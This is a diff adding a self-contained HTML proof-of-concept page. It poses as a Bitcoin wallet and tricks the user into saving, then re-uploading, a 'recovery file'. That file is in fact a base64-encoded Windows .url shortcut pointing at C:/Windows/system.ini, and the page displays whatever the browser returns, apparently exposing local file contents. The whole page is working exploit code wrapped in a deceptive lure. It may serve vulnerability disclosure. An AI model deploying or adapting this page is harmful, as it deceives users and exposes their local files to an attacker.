@@ -1,0 +1,221 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POC | Windows</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            margin: auto;
+            text-align: left;
+            max-width: 1000px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        button {
+            cursor: pointer;
+            padding: 10px 15px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>I'm a Bitcoin Wallet</h1>
+        <div class="hidden stage" id="stage0">
+            <button id="new_bitcoin_wallet">New Bitcoin Wallet</button>
+        </div>
+        <div class="hidden stage" id="stage1">
+            <p>Your bitcoin wallet was successfully created.</p>
+            <p>Address: 1FZbgi39cpjq0Gjc5V8eyHuJJnkLtktWc4</p>
+            <p><strong>Please download the wallet recovery file before using it.</strong></p>
+            <button id="download_recovery_file">Save Recovery File</button>
+        </div>
+        <div class="hidden stage" id="stage2">
+            <p>Test the recovery file you just downloaded to ensure it was saved properly.</p>
+            <button id="upload_recovery_file">Upload Recovery File</button>
+            <input class="hidden" id="file_selector" type="file" />
+        </div>
+        <div class="hidden stage" id="stage3">
+            <pre id="pre"></pre>
+        </div>
+    </div>
+    <script>
+        /**
+     * Open a handle to an existing file on the local file system.
+     *
+     * @return {!Promise<FileSystemFileHandle>} Handle to the existing file.
+     */
+        function getFileHandle() {
+            // For Chrome 86 and later...
+            if ('showOpenFilePicker' in window) {
+                return window.showOpenFilePicker().then((handles) => handles[0]);
+            }
+            // For Chrome 85 and earlier...
+            return window.chooseFileSystemEntries();
+        }
+
+        /**
+         * Create a handle to a new (text) file on the local file system.
+         *
+         * @return {!Promise<FileSystemFileHandle>} Handle to the new file.
+         */
+        function getNewFileHandle() {
+            // For Chrome 86 and later...
+            if ('showSaveFilePicker' in window) {
+                const opts = {
+                    suggestedName: 'Wallet',
+                    types: [{
+                        description: 'Text file',
+                        accept: { 'text/plain': ['.url'] },
+                    }],
+                };
+                return window.showSaveFilePicker(opts);
+            }
+        }
+
+        /**
+         * Reads the raw text from a file.
+         *
+         * @param {File} file
+         * @return {!Promise<string>} A promise that resolves to the parsed string.
+         */
+        function readFile(file) {
+            // If the new .text() reader is available, use it.
+            if (file.text) {
+                return file.text();
+            }
+            // Otherwise use the traditional file reading technique.
+            return _readFileLegacy(file);
+        }
+
+        /**
+         * Reads the raw text from a file.
+         *
+         * @private
+         * @param {File} file
+         * @return {Promise<string>} A promise that resolves to the parsed string.
+         */
+        function _readFileLegacy(file) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.addEventListener('loadend', (e) => {
+                    const text = e.srcElement.result;
+                    resolve(text);
+                });
+                reader.readAsText(file);
+            });
+        }
+
+        /**
+         * Writes the contents to disk.
+         *
+         * @param {FileSystemFileHandle} fileHandle File handle to write to.
+         * @param {string} contents Contents to write.
+         */
+        async function writeFile(fileHandle, contents) {
+            // Support for Chrome 82 and earlier.
+            if (fileHandle.createWriter) {
+                // Create a writer (request permission if necessary).
+                const writer = await fileHandle.createWriter();
+                // Write the full length of the contents
+                await writer.write(0, contents);
+                // Close the file and write the contents to disk
+                await writer.close();
+                return;
+            }
+            // For Chrome 83 and later.
+            // Create a FileSystemWritableFileStream to write to.
+            const writable = await fileHandle.createWritable();
+            // Write the contents of the file to the stream.
+            await writable.write(contents);
+            // Close the file and write the contents to disk.
+            await writable.close();
+        }
+
+        /**
+         * Verify the user has granted permission to read or write to the file, if
+         * permission hasn't been granted, request permission.
+         *
+         * @param {FileSystemFileHandle} fileHandle File handle to check.
+         * @param {boolean} withWrite True if write permission should be checked.
+         * @return {boolean} True if the user has granted read/write permission.
+         */
+        async function verifyPermission(fileHandle, withWrite) {
+            const opts = {};
+            if (withWrite) {
+                opts.writable = true;
+                // For Chrome 86 and later...
+                opts.mode = 'readwrite';
+            }
+            // Check if we already have permission, if so, return true.
+            if (await fileHandle.queryPermission(opts) === 'granted') {
+                return true;
+            }
+            // Request permission to the file, if the user grants permission, return true.
+            if (await fileHandle.requestPermission(opts) === 'granted') {
+                return true;
+            }
+            // The user did not grant permission, return false.
+            return false;
+        }
+    </script>
+    <script>
+        const binary = base64ToArrayBuffer("W3swMDAyMTRBMC0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDZ9XQ0KUHJvcDM9MTksMg0KW0ludGVybmV0U2hvcnRjdXRdDQpJRExpc3Q9DQpVUkw9ZmlsZTovL0M6L1dpbmRvd3Mvc3lzdGVtLmluaQ0KSG90S2V5PTA=");
+
+        function base64ToArrayBuffer(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array(len);
+            for (var i = 0; i < len; i++) {
+                bytes[i] = binary_string.charCodeAt(i);
+            }
+            return bytes.buffer;
+        }
+
+        function setStage(n) {
+            document.querySelectorAll(".stage").forEach(stage => stage.classList.add("hidden"));
+            window["stage" + n].classList.remove("hidden");
+        }
+
+        window.new_bitcoin_wallet.addEventListener("click", () => setStage(1));
+        window.upload_recovery_file.addEventListener("click", () => window.file_selector.click());
+
+        window.file_selector.addEventListener("change", async function (event) {
+            let files = Array.from(event.target.files);
+            let contents = "";
+            for (let file of files) {
+                contents += await readFile(file);
+            }
+            window.pre.innerText = contents;
+            setStage(3);
+        });
+
+        window.download_recovery_file.addEventListener("click", async function () {
+            try {
+                window.handle = await getNewFileHandle();
+                await writeFile(window.handle, binary);
+                setStage(2);
+            } catch (ex) {
+                alert("You must save the recovery file.");
+            }
+        });
+
+        setStage(0);
+    </script>
+</body>
+
+</html>
